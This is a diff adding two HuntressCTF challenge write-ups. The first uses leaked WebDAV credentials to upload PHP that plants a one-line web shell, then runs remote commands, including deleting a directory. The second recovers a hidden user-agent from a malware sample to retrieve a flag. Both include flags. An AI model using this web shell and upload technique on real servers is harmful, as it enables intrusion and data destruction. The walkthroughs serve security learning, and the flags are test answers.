@@ -2366,3 +2366,156 @@ Note: variable order
 >>> ''.join([chr(x1^x2) for x1, x2 in zip(d1, d2)])
 'flag{0af2873a74cfa957ccb90cef814cfe3d}'
 ```
+
+## Operation Eradication
+
+### Description
+
+> Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment! They stole our data!
+>
+> Luckily, we found what looks like a configuration file, that seems to have credentials to the actor's storage server... but it doesn't seem to work. Can you get onto their server and delete all the data they stole!?
+>
+> Download the file(s) below and press the Start button on the top-right to begin this challenge.
+>
+> Attachments: operation_eradication
+
+### Flag
+
+flag{564607375b731174f2c08c5bf16e82b4}
+
+### Solution
+
+Useful tools: [Rclone](https://rclone.org/)
+
+The attached `operation_eradication` file is the following:
+
+```text
+type = webdav
+url = http://localhost/webdav
+vendor = other
+user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
+pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
+```
+
+Modified `~/.config/rclone/rclone.conf` for rclone config file:
+
+~/.config/rclone/rclone.conf
+
+```init
+[test]
+type = webdav
+url = http://chal.ctf.games:30870/webdav
+vendor = other
+user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
+pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
+```
+
+Then, mount it
+
+```bash
+mkdir -p mnt
+rclone mount test:/ ./mnt
+```
+
+Opened another terminal, uploaded test.php to `mnt` directory, executed it.
+test.php is the PHP code to write ``<?=`$_GET[0]`?>`` to ../shell.php.
+
+```console
+root@kali:~/ctf/HuntressCTF/mnt# echo -ne '<?=`$_GET[0]`?>' | base64
+PD89YCRfR0VUWzBdYD8+
+
+root@kali:~/ctf/HuntressCTF/mnt# echo -ne '<?php $myfile = fopen("../shell.php", "w") or die("Unable to open file!"); $txt = base64_decode("PD89YCRfR0VUWzBdYD8+"); fwrite($myfile, $txt); fclose($myfile); ?>' > test.php
+
+root@kali:~/ctf/HuntressCTF/mnt# curl http://chal.ctf.games:30870/shell.php  # see if shell.php is generated
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.54 (Debian) Server at chal.ctf.games Port 30870</address>
+</body></html>
+
+root@kali:~/ctf/HuntressCTF/mnt# cat test.php  # execute test.php
+(snip)
+root@kali:~/ctf/HuntressCTF/mnt# curl http://chal.ctf.games:30870/shell.php  # see if shell.php is generated
+<br />
+<b>Warning</b>:  shell_exec(): Cannot execute a blank command in <b>/var/www/html/shell.php</b> on line <b>1</b><br />
+
+root@kali:~/ctf/HuntressCTF/mnt# curl http://chal.ctf.games:30870/shell.php?0=ls
+index.php
+shell.php
+webdav
+
+root@kali:~/ctf/HuntressCTF/mnt# curl -G 'http://chal.ctf.games:30870/shell.php' --data-urlencode "0=rm -fr webdav"
+
+root@kali:~/ctf/HuntressCTF/mnt# curl -s http://chal.ctf.games:30870/ | grep -oE 'flag{[0-9a-z]{32}}'
+flag{564607375b731174f2c08c5bf16e82b4}
+```
+
+## Speakfriend
+
+### Description
+
+> It seems like this website was compromised. We found this file that seems to be related... can you make any sense of these and uncover a flag?
+>
+> NOTE:
+>
+> - Archive password is infected
+> - You will need access this service with HTTPS. Please use https:// as the URL schema rather than plain http://.
+> - This website uses a self-signed certificate. The "Warning: connection not secure" message is expected and intended. You can continue on to the website.
+> - This challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abundance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
+>
+>
+> Press the Start button on the top-right to begin this challenge.
+> Attachments: main.7z
+
+### Flag
+
+flag{3f2567475c6def39501bab2865aeba60}
+
+### Solution
+
+The `main` executable executes cURL with the user agent `Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e` against the URL passed as an argument.
+
+1. Listen 80 port `nc -lnvp 80`
+2. Execute `main` binary: `./main http://localhost`
+3. Looking at `nc` output:
+
+   ```console
+   root@kali:~/ctf/HuntressCTF# nc -lnvp 80
+   listening on [any] 80 ...
+   connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38276
+   GET / HTTP/1.1
+   Host: localhost
+   User-Agent: Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e
+   Accept: */*
+   ```
+
+Also, we can find this user agent compiled with Ghidra.
+
+main function decompiled with Ghidra:
+
+```c
+    local_1c8 = 0x2f616c6c697a6f4d;
+    local_1c0 = 0x6562333920302e35;
+    local_1b8 = 0x3762372d62353464;
+    local_1b0 = 0x392d373930342d30;
+    local_1a8 = 0x346138392d393732;
+    local_1a0 = 0x6533353330666561;
+    local_198[0] = '\0';
+```
+
+```python
+>>> from pwn import p64
+>>> b''.join([p64(0x2f616c6c697a6f4d), p64(0x6562333920302e35), p64(0x3762372d62353464), p64(0x392d373930342d30), p64(0x346138392d393732), p64(0x6533353330666561)])
+b'Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e'
+```
+
+Got flag:
+
+```console
+root@kali:~/ctf/HuntressCTF# curl -kL -A 'Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e' https://chal.ctf.games:30842
+flag{3f2567475c6def39501bab2865aeba60}
+```
